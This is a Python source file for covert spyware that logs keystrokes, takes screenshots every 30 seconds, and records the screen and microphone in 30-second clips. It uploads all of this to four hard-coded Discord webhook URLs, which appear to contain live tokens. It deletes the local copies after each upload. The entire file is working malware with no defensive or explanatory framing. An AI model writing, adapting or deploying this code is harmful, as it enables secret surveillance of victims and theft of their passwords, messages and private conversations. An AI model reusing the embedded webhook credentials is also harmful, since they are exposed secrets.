import cv2
import mss
import numpy as np
import os
import tempfile
import requests
import time
import pyaudio
import wave
from pynput import keyboard
import schedule

# Webhook URLs
SCREEN_WEBHOOK_URL = "https://discord.com/api/webhooks/1252261362097192961/p0tzj_iJN8c-Iv3AdvPA-oNQBBwnzFnbRLAE5ibTCWvH93IMBxW3TarBbO1VNLAhMLTI"
AUDIO_WEBHOOK_URL = "https://discord.com/api/webhooks/1259623619332411524/KdAhb0i7oTwfaFsHfhYfQJda5Cx7DgS5S7c27Fan_LAxN25A3KbPq3wqgaVY1vI_Eome"
KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1246901796782473329/rcIggVdzfYRUJVYMjJgZcRrc3Z8fWjEWEm83dmxB48kpM1erU04lp7GBX4CSlqy9rn5x'
SCREENSHOT_WEBHOOK_URL = 'https://discord.com/api/webhooks/1244445585373794325/ZIlEfyS5C1HBedpugnAq_lOxgi538WzXQFszdga4SbPRzbILEfivhECVTNNRS2NCC6-5'

# Path for keylog file
KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"

# Function to send files to Discord
def send_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as file:
        response = requests.post(
            webhook_url,
            files={"file": file}
        )
    return response.status_code

# Screen recording function
def record_screen(output_path, record_time=30, fps=8):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Use the primary monitor
        width = monitor["width"]
        height = monitor["height"]

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))

        num_frames = record_time * fps

        for _ in range(num_frames):
            sct_img = sct.grab(monitor)
            frame = np.array(sct_img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            out.write(frame)

        out.release()

# Audio recording function
def record_audio(output_path, record_time=30, channels=1, rate=16000, chunk=1024):
    audio = pyaudio.PyAudio()

    stream = audio.open(format=pyaudio.paInt16, channels=channels,
                        rate=rate, input=True,
                        frames_per_buffer=chunk)

    frames = []

    for _ in range(0, int(rate / chunk * record_time)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    with wave.open(output_path, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

# Keylogger functionality
ignored_keys = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.cmd_l,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.tab,
    keyboard.Key.esc,
    keyboard.Key.space,
    keyboard.Key.backspace,
    keyboard.Key.enter
}

last_key_pressed = None

def key_press(key):
    global last_key_pressed
    try:
        if key != last_key_pressed:
            with open(KEYLOG_PATH, 'a') as logKey:
                if hasattr(key, 'char') and key.char is not None:
                    logKey.write(key.char)
                elif key not in ignored_keys:
                    logKey.write(f'[{key}]')
        last_key_pressed = key
    except Exception as e:
        pass

def key_release(key):
    global last_key_pressed
    last_key_pressed = None

def send_keylog_to_discord():
    try:
        with open(KEYLOG_PATH, 'rb') as file:
            payload = {'content': 'Here is the keyhits.txt file'}
            files = {'file': file}
            response = requests.post(KEYLOGGER_WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 200:
                print("Keylog sent successfully.")
            else:
                print(f"Failed to send keylog. Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send keylog. Error: {e}")

# Screenshot functionality
def ensure_ss_folder_exists():
    temp_dir = os.path.join(tempfile.gettempdir(), 'ss')
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)
    return temp_dir

def take_screenshot(output_path):
    with mss.mss() as sct:
        sct.shot(mon=-1, output=output_path)

def send_screenshot_to_discord(output_path, webhook_url):
    take_screenshot(output_path)
    status = send_to_discord(output_path, webhook_url)
    if status == 200:
        print("Screenshot sent successfully.")
    else:
        print(f"Failed to send screenshot. Status code: {status}")

def scheduled_screenshots():
    temp_dir = ensure_ss_folder_exists()
    screenshot_path = os.path.join(temp_dir, 'screenshot.png')
    send_screenshot_to_discord(screenshot_path, SCREENSHOT_WEBHOOK_URL)

if __name__ == "__main__":
    # Create the keylog file if it doesn't exist
    if not os.path.exists(KEYLOG_PATH):
        with open(KEYLOG_PATH, 'a'):
            pass

    # Set up the keylogger listener
    listener = keyboard.Listener(on_press=key_press, on_release=key_release)
    listener.start()

    # Schedule tasks to send logs and perform recordings
    schedule.every(1).minute.do(send_keylog_to_discord)
    schedule.every(30).seconds.do(scheduled_screenshots)

    clip_number = 1
    while True:
        # Schedule and run pending tasks
        schedule.run_pending()

        # Screen recording
        try:
            temp_dir = tempfile.gettempdir()
            screen_output_path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
            record_screen(screen_output_path, record_time=30)
            status = send_to_discord(screen_output_path, SCREEN_WEBHOOK_URL)
            if status == 200:
                print(f"Screen record {screen_output_path} sent successfully.")
                os.remove(screen_output_path)
                clip_number += 1
            else:
                print(f"Failed to send screen record {screen_output_path}, status code: {status}")
                time.sleep(5)
        except Exception as e:
            print(f"An error occurred during screen recording: {e}")
            time.sleep(5)

        # Audio recording
        try:
            temp_dir = tempfile.gettempdir()
            audio_output_path = os.path.join(temp_dir, f"voice_record_{clip_number}.wav")
            record_audio(audio_output_path, record_time=30)
            status = send_to_discord(audio_output_path, AUDIO_WEBHOOK_URL)
            if status == 200:
                print(f"Audio record {audio_output_path} sent successfully.")
                os.remove(audio_output_path)
                clip_number += 1
            else:
                print(f"Failed to send audio record {audio_output_path}, status code: {status}")
                time.sleep(5)
        except Exception as e:
            print(f"An error occurred during audio recording: {e}")
            time.sleep(5)

        # Pause to allow other tasks to run
        time.sleep(1)
